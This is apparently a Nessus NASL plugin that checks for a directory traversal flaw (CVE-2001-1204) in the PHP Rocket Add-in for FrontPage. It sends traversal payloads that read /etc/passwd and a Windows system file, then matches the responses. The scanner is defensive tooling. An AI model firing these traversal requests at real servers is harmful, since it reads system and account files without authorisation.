#
# This script was written by Drew Hintz ( http://guh.nu ) and Valeska Pederson
#
# It is based on scripts written by Renaud Deraison and  HD Moore
#
# See the Nessus Scripts License for details
#


include("compat.inc");

if(description)
{
 script_id(10831);
 script_version("$Revision: 1.27 $");
 script_cve_id("CVE-2001-1204");
 script_bugtraq_id(3751);
 script_osvdb_id(694);

 script_name(english:"PHP Rocket for FrontPage phprocketaddin page Parameter Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"Arbitrary files may be read on the remote server." );
 script_set_attribute(attribute:"description", value:
"There is a vulnerability in the PHP Rocket Add-in for FrontPage that
allows a remote attacker to view the contents of any arbitrary file
to which the web user has access.  This vulnerability exists because the
PHP Rocket Add-in does not filter out ../ and is, therefore, susceptible
to this directory traversal attack." );
 script_set_attribute(attribute:"solution", value: "None");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/01/17");
 script_cvs_date("$Date: 2016/11/23 20:42:23 $");
 script_set_attribute(attribute:"vuln_publication_date", value: "2001/12/28");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe",value:"cpe:/a:total_pc_solutions:php_rocket_add-in");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 summary["english"] = "Looks for a directory traversal vulnerability in the PHP Rocket Add-in for FrontPage.";

 script_summary(english:summary["english"]);
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2002-2016 H D Moore & Drew Hintz ( http://guh.nu )");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}


include("http_func.inc");
include("global_settings.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);
if (get_kb_item("Services/www/"+port+"/embedded" ) ) exit(0);



#check for vulnerable version running on *nix

function check(req)
{
 local_var pat, r, soc;

 soc = http_open_socket(port);
 if(soc)
 {
 req = http_get(item:req, port:port);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);

 http_close_socket(soc);
 pat = "root:"; #string returned by webserver if it's vulnerable
 if(pat >< r) {
   if(egrep(pattern:".*root:.*:0:[01]:.*", string:r)) {
	   	security_warning(port:port);
		exit(0);
   } #end final if pattern match
  } #ends outer if pattern match
 } #ends outer if(soc)
 return(0);
} #ends function

url = string("/phprocketaddin/?page=../../../../../../../../../../../../../../../etc/passwd");
if(check(req:url))exit(0);

url = string("/index.php?page=../../../../../../../../../../../../../../../etc/passwd");
if(check(req:url))exit(0);


#check for vulnerable version running on Windows


function checkwin(req)
{
 local_var pat, r, soc;

 soc = http_open_socket(port);
 if(soc)
 {
 req = http_get(item:req, port:port);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);

 http_close_socket(soc);
 pat = "IP Configuration"; #string returned by webserver if it's vulnerable

 if(pat >< r) {
   	security_warning(port:port);
	return(1);
 	}
 }
 return(0);
}

url = string("/phprocketaddin/?page=../../../../../../../../../../../../../../../WINNT/system32/ipconfig.exe");
if(checkwin(req:url))exit(0);

url = string("/index.php?page=../../../../../../../../../../../../../../../../../WINNT/system32/ipconfig.exe");
if(checkwin(req:url))exit(0);





